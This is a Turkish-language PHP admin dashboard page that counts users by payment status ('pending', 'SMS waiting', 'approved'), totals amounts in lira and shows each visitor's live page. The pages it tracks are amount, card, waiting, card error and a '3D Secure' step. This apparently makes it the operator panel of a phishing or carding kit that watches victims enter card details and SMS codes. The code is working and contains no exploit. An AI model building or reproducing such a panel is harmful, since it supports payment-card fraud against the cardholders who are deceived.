<?php
// Veritabanı bağlantısı
require_once '../config.php';

// Varsayılan değerler
$totalUsers = 0;
$pendingUsers = 0;
$smsWaiting = 0;
$approved = 0;
$totalAmount = 0;
$onlineUsers = 0;
$guestUsers = 0;
$totalVisitors = 0;
$recentUsers = [];
$error = null;

try {
    $pdo = getDbConnection();
    $pdo->setAttribute(PDO::ATTR_TIMEOUT, 5);
    
    // Online users tablosunu oluştur veya güncelle
    $pdo->exec("
        CREATE TABLE IF NOT EXISTS online_users (
            id INT AUTO_INCREMENT PRIMARY KEY,
            session_id VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL UNIQUE,
            user_identifier VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL,
            ip_address VARCHAR(45) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
            current_page VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
            user_agent TEXT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
            last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            INDEX idx_session (session_id),
            INDEX idx_user_identifier (user_identifier),
            INDEX idx_last_activity (last_activity)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    ");
    
    // Kolon yoksa ekle
    try {
        $pdo->exec("ALTER TABLE online_users ADD COLUMN user_identifier VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL AFTER session_id");
    } catch(PDOException $e) {
        // Kolon zaten varsa hata vermez
    }
    
    try {
        $pdo->exec("ALTER TABLE online_users ADD INDEX idx_user_identifier (user_identifier)");
    } catch(PDOException $e) {
        // Index zaten varsa hata vermez
    }
    
    // Collation'ı düzelt
    try {
        $pdo->exec("ALTER TABLE online_users 
            MODIFY session_id VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
            MODIFY user_identifier VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL,
            MODIFY ip_address VARCHAR(45) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
            MODIFY current_page VARCHAR(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL
        ");
    } catch(PDOException $e) {
        // Hata vermez
    }
    
    // İstatistikler
    $totalUsers = $pdo->query("SELECT COUNT(*) FROM users")->fetchColumn();
    $pendingUsers = $pdo->query("SELECT COUNT(*) FROM users WHERE payment_status = 'pending'")->fetchColumn();
    $smsWaiting = $pdo->query("SELECT COUNT(*) FROM users WHERE payment_status = 'sms_waiting'")->fetchColumn();
    $approved = $pdo->query("SELECT COUNT(*) FROM users WHERE payment_status = 'approved'")->fetchColumn();
    $totalAmount = $pdo->query("SELECT SUM(total) FROM users WHERE payment_status = 'approved'")->fetchColumn() ?? 0;
    
    // Online users tablosu var mı kontrol et
    $tableExists = $pdo->query("SHOW TABLES LIKE 'online_users'")->rowCount() > 0;
    if ($tableExists) {
        $onlineUsers = $pdo->query("SELECT COUNT(*) FROM online_users WHERE last_activity > DATE_SUB(NOW(), INTERVAL 5 MINUTE) AND user_identifier IS NOT NULL")->fetchColumn();
        $guestUsers = $pdo->query("SELECT COUNT(*) FROM online_users WHERE last_activity > DATE_SUB(NOW(), INTERVAL 5 MINUTE) AND user_identifier IS NULL")->fetchColumn();
        $totalVisitors = $pdo->query("SELECT COUNT(DISTINCT session_id) FROM online_users")->fetchColumn();
    } else {
        $guestUsers = 0;
        $totalVisitors = 0;
    }
    
    // Son kullanıcılar
    $recentUsers = $pdo->query("
        SELECT 
            u.*,
            o.current_page,
            o.last_activity,
            TIMESTAMPDIFF(MICROSECOND, o.last_activity, NOW()) / 1000000 as seconds_ago
        FROM users u
        LEFT JOIN online_users o ON u.user_identifier COLLATE utf8mb4_unicode_ci = o.user_identifier COLLATE utf8mb4_unicode_ci
            AND o.last_activity > DATE_SUB(NOW(), INTERVAL 5 MINUTE)
        ORDER BY u.created_at DESC 
        LIMIT 10
    ")->fetchAll(PDO::FETCH_ASSOC);
    
} catch(PDOException $e) {
    $error = $e->getMessage();
}
?>

<?php if ($error): ?>
<div style="background: #fee; border: 1px solid #fcc; color: #c33; padding: 1rem; border-radius: 8px; margin-bottom: 1rem;">
    <strong>Veritabanı Hatası:</strong> <?= htmlspecialchars($error) ?>
</div>
<?php endif; ?>

<div class="stats-grid">
    <div class="stat-card">
        <div class="stat-header">
            <span class="stat-title">Toplam Kullanıcı</span>
            <div class="stat-icon primary">
                <i class="fas fa-users"></i>
            </div>
        </div>
        <div class="stat-value"><?= $totalUsers ?></div>
    </div>
    
    <div class="stat-card">
        <div class="stat-header">
            <span class="stat-title">Bekleyen</span>
            <div class="stat-icon warning">
                <i class="fas fa-clock"></i>
            </div>
        </div>
        <div class="stat-value"><?= $pendingUsers ?></div>
    </div>
    
    <div class="stat-card">
        <div class="stat-header">
            <span class="stat-title">SMS Bekliyor</span>
            <div class="stat-icon primary">
                <i class="fas fa-sms"></i>
            </div>
        </div>
        <div class="stat-value"><?= $smsWaiting ?></div>
    </div>
    
    <div class="stat-card">
        <div class="stat-header">
            <span class="stat-title">Onaylanan</span>
            <div class="stat-icon success">
                <i class="fas fa-check-circle"></i>
            </div>
        </div>
        <div class="stat-value"><?= $approved ?></div>
    </div>
    
    <div class="stat-card">
        <div class="stat-header">
            <span class="stat-title">Toplam Ziyaretçi</span>
            <div class="stat-icon danger">
                <i class="fas fa-globe"></i>
            </div>
        </div>
        <div class="stat-value"><?= $totalVisitors ?></div>
    </div>
    

</div>

<div class="card">
    <div class="card-header">
        <h2 class="card-title">Son Kullanıcılar</h2>
        <a href="?page=users" class="btn btn-primary btn-sm">Tümünü Gör</a>
    </div>
    <div class="card-body">
        <table>
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Kimlik</th>
                    <th>Tutar</th>
                    <th>Durum</th>
                    <th>📍 Sayfa</th>
                    <th>Tarih</th>
                </tr>
            </thead>
            <tbody>
                <?php if (empty($recentUsers)): ?>
                <tr>
                    <td colspan="6" style="text-align: center; color: #718096; padding: 2rem;">
                        Henüz kullanıcı yok
                    </td>
                </tr>
                <?php else: ?>
                <?php foreach($recentUsers as $user): ?>
                <tr>
                    <td>#<?= $user['id'] ?></td>
                    <td><?= htmlspecialchars($user['identifier_value']) ?></td>
                    <td><?= number_format($user['total'], 2) ?> ₺</td>
                    <td>
                        <?php
                        $statusMap = [
                            'pending'     => ['cls' => 'waiting', 'label' => 'Bekliyor'],
                            'sms_waiting' => ['cls' => 'sms',     'label' => 'SMS Bekleniyor'],
                            'approved'    => ['cls' => 'online',  'label' => 'Onaylandı'],
                        ];
                        $st = $statusMap[$user['payment_status']] ?? ['cls' => $user['payment_status'], 'label' => $user['payment_status']];
                        ?>
                        <span class="status <?= $st['cls'] ?>"><?= $st['label'] ?></span>
                    </td>
                    <td>
                        <?php
                        $isOnline = $user['seconds_ago'] !== null && $user['seconds_ago'] < 5;
                        $pageNames = [
                            '/index.php' => 'Ana Sayfa',
                            '/screen2.php' => 'Tutar',
                            '/screen3.php' => 'Kart',
                            '/bekle.php' => 'Bekleme',
                            '/success.php' => 'Başarılı',
                            '/error_card.php' => 'Hata'
                        ];
                        $pageName = 'Çevrimdışı';
                        if ($user['current_page']) {
                            foreach ($pageNames as $path => $name) {
                                if (strpos($user['current_page'], $path) !== false) {
                                    $pageName = $name;
                                    break;
                                }
                            }
                            if (strpos($user['current_page'], '/acs/') !== false) {
                                $pageName = '3D Secure';
                            }
                        }
                        $color = $isOnline ? '#2ecc71' : '#95a5a6';
                        $onlineLabel = $isOnline ? 'Aktif' : 'Çevrimdışı';
                        ?>
                        <span style="color: <?= $color ?>; font-size: 0.85rem;">
                            <?= $isOnline ? '🟢' : '⚫' ?> <?= $isOnline ? $onlineLabel : $pageName ?>
                        </span>
                    </td>
                    <td><?= date('d.m.Y H:i', strtotime($user['created_at'])) ?></td>
                </tr>
                <?php endforeach; ?>
                <?php endif; ?>
            </tbody>
        </table>
    </div>
</div>
